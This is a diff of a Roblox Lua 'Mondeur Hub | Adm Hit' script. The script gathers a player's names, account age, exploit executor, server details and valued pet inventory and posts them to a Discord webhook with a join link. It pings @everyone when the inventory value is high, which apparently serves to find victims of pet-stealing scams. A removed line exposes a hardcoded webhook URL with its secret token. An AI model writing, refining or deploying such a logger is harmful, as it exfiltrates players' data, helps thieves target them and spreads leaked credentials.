@@ -1,80 +1,245 @@
+--// MONDEUR HUB | ADM HIT 🦊 (FINAL OPTIMIZED CORE)
+
 local HttpService = game:GetService("HttpService")
 
+-- =========================
+-- ⚙️ CONFIG
+-- =========================
 local cfg = getgenv().MondeurConfig or {}
-local webhook = cfg.Webhook or "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
-local threshold = tonumber(cfg.Threshold) or 0
 
-local req =
+local WEBHOOK = cfg.Webhook or ""
+local VALUE_URL = cfg.ValueURL or ""
+
+local LOW_THRESHOLD = 300
+local HIGH_THRESHOLD = 1500
+
+if WEBHOOK == "" then
+    warn("❌ Missing webhook")
+    return
+end
+
+-- =========================
+-- 🌐 REQUEST DETECTION
+-- =========================
+local requestFunc =
     (syn and syn.request) or
     (http and http.request) or
     (http_request) or
     (request)
 
-if not req then
+if not requestFunc then
     warn("❌ No request function")
     return
 end
 
-local function sendWebhook(player, pets, totalValue, joinLink)
+-- =========================
+-- 🧠 NAME NORMALIZATION (BIG FIX)
+-- =========================
+local function normalize(str)
+    str = tostring(str or ""):lower()
+    str = str:gsub("_"," ")
+    str = str:gsub("[^%w%s]","")
+    str = str:gsub("%s+"," ")
+    return str
+end
 
-    local function getEmoji(p)
-        local e = ""
-        if p.mega then e ..= "🌈 " elseif p.neon then e ..= "🟣 " end
-        if p.fly then e ..= "🪽 " end
-        if p.ride then e ..= "🏇 " end
-        return e
+-- =========================
+-- 🌍 FETCH VALUES
+-- =========================
+local function fetchValues()
+    if VALUE_URL == "" then return {} end
+
+    local ok, res = pcall(function()
+        return requestFunc({ Url = VALUE_URL, Method = "GET" })
+    end)
+
+    if ok and res and res.StatusCode == 200 then
+        local success, decoded = pcall(function()
+            return HttpService:JSONDecode(res.Body)
+        end)
+
+        if success and type(decoded) == "table" then
+            -- normalize keys
+            local fixed = {}
+            for k,v in pairs(decoded) do
+                fixed[normalize(k)] = tonumber(v) or 0
+            end
+            return fixed
+        end
     end
 
-    local lines = {}
-    for i, p in ipairs(pets) do
-        if i > 12 then break end
-        table.insert(lines,
-            string.format("%s%s x%d", getEmoji(p), p.name, p.count)
-        )
-    end
+    warn("⚠️ Value fetch failed")
+    return {}
+end
 
-    local content = (totalValue >= threshold) and "@everyone" or ""
+-- =========================
+-- 🎨 COLORS
+-- =========================
+local rarityColors = {
+    legendary = 0xFFD700,
+    ultra_rare = 0xA020F0,
+    rare = 0x1E90FF,
+    uncommon = 0x32CD32,
+    common = 0xB0B0B0
+}
 
-    local data = {
-        content = content,
-        embeds = {{
-            title = "🦊 Mondeur Hub | Adm Hit",
+-- =========================
+-- 🏷️ EMOJIS
+-- =========================
+local function emoji(p)
+    local e = ""
+    if p.mega then e ..= "🌈 " elseif p.neon then e ..= "🟣 " end
+    if p.fly then e ..= "🪽 " end
+    if p.ride then e ..= "🏇 " end
+    return e
+end
 
-            description =
-                "```" ..
-                "👤 Display Name : " .. player.displayName .. "\n" ..
-                "🆔 Username     : " .. player.username .. "\n" ..
-                "📅 Account Age  : " .. player.accountAge .. " days\n" ..
-                "📱 Executor     : " .. player.executor .. "\n" ..
-                "👥 Players      : " .. player.players .. "\n" ..
-                "💰 Total Value  : " .. totalValue ..
-                "```",
+-- =========================
+-- 📦 PROCESS PETS (OPTIMIZED)
+-- =========================
+local function process(pets, values)
+    local map, total = {}, 0
 
-            fields = {
-                {
-                    name = "🐶 Pets (Best → Worst)",
-                    value = "```" .. table.concat(lines, "\n") .. "```"
-                },
-                {
-                    name = "🌐 Join",
-                    value = "[Click to Join](" .. joinLink .. ")"
+    for _, p in ipairs(pets or {}) do
+        if p and p.name then
+            local clean = normalize(p.name)
+            local val = values[clean] or 0
+
+            if not map[clean] then
+                map[clean] = {
+                    name = p.name,
+                    count = 0,
+                    value = val,
+                    rarity = (p.rarity or "common"):lower(),
+                    neon = p.neon,
+                    mega = p.mega,
+                    fly = p.fly,
+                    ride = p.ride
                 }
-            },
+            end
 
-            footer = {text = "Mondeuronbotton"}
-        }}
+            map[clean].count += 1
+            total += val
+        end
+    end
+
+    local list = {}
+    for _, v in pairs(map) do table.insert(list, v) end
+
+    table.sort(list, function(a,b)
+        return a.value > b.value
+    end)
+
+    return list, total
+end
+
+-- =========================
+-- 📋 FORMAT
+-- =========================
+local function format(list)
+    local t = {}
+    for i, p in ipairs(list) do
+        if i > 12 then break end
+        table.insert(t, string.format("%s%s x%d", emoji(p), p.name, p.count))
+    end
+    return (#t > 0 and table.concat(t,"\n") or "No pets")
+end
+
+-- =========================
+-- 📊 TIER SYSTEM
+-- =========================
+local function getTier(v)
+    if v >= HIGH_THRESHOLD then return "🔴 HIGH" end
+    if v >= LOW_THRESHOLD then return "🟡 MID" end
+    return "🟢 LOW"
+end
+
+-- =========================
+-- 🚀 MAIN
+-- =========================
+local function Run(data)
+    if not data or not data.player then
+        warn("❌ Invalid input")
+        return
+    end
+
+    print("🔄 Fetching values...")
+    local values = fetchValues()
+
+    print("📦 Processing pets...")
+    local list, total = process(data.pets, values)
+
+    local best = list[1] and (list[1].name.." x"..list[1].count) or "None"
+    local petList = format(list)
+    local tier = getTier(total)
+
+    local content = (tier == "🔴 HIGH") and "@everyone" or ""
+    local color = rarityColors[list[1] and list[1].rarity or "common"] or 0x2F3136
+
+    local embed = {
+        title = "🦊 Mondeur Hub | Adm Hit",
+
+        description =
+            "```" ..
+            "👤 Display Name : "..data.player.displayName.."\n"..
+            "🆔 Username     : "..data.player.username.."\n"..
+            "📅 Account Age  : "..data.player.accountAge.." days\n"..
+            "📱 Executor     : "..data.player.executor.."\n"..
+            "👥 Players      : "..data.player.players.."\n"..
+            "💰 Total Value  : "..total.."\n"..
+            "📊 Tier         : "..tier..
+            "```",
+
+        fields = {
+            {name="🏆 Best Pet", value="```"..best.."```"},
+            {name="🐶 Pets (Best → Worst)", value="```"..petList.."```"},
+            {name="🌐 Join Server", value="[Click to Join]("..(data.joinLink or "https://www.roblox.com")..")"}
+        },
+
+        color = color,
+        footer = {text = "Mondeuronbotton"}
     }
 
+    print("📡 Sending webhook...")
+
     task.spawn(function()
-        pcall(function()
-            req({
-                Url = webhook,
+        local ok, res = pcall(function()
+            return requestFunc({
+                Url = WEBHOOK,
                 Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(data)
+                Headers = {["Content-Type"]="application/json"},
+                Body = HttpService:JSONEncode({
+                    content = content,
+                    embeds = {embed}
+                })
             })
         end)
+
+        if ok and res then
+            print("✅ Sent:", res.StatusCode)
+        else
+            warn("❌ Webhook failed")
+        end
     end)
 end
 
-return sendWebhook
+-- =========================
+-- 🧪 TEST INPUT
+-- =========================
+Run({
+    player = {
+        displayName = game.Players.LocalPlayer.DisplayName,
+        username = game.Players.LocalPlayer.Name,
+        accountAge = game.Players.LocalPlayer.AccountAge,
+        executor = (identifyexecutor and identifyexecutor()) or "Unknown",
+        players = #game.Players:GetPlayers().."/"..game.Players.MaxPlayers
+    },
+
+    joinLink = "https://www.roblox.com",
+
+    pets = {
+        {name="Metal_Ox", rarity="legendary", neon=true, ride=true},
+        {name="metal ox", rarity="legendary", neon=true, ride=true},
+        {name="Dog", rarity="common"}
+    }
+})
